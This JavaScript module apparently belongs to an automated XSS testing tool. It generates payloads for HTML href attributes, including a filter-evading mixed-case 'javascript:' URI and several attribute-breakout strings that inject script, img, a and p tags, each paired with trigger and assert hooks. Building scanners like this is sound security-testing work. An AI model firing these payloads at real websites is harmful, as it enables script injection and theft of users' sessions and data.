const {getTriggerCodeForCode} = require("./generators");

function htmlHrefAttributePayloads({jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
    return [{
        payload: `JAvaSCriPt:${jsCode}`,
        trigger: getTriggerCodeForCode(`JAvaSCriPt:${jsCode}`),
        assert,
    }, {
        payload: `">${scriptTag}`,
        assert,
    }, {
        payload: `">${imgTag}`,
        assert,
    }, {
        payload: `">${aTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `">${pTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `">${scriptTag}<a href="`,
        assert,
    }, {
        payload: `">${imgTag}<a href="`,
        assert,
    }, {
        payload: `">${aTag}<a href="`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `">${pTag}<a href="`,
        trigger: tagTrigger,
        assert,
    }];
}

module.exports = htmlHrefAttributePayloads;
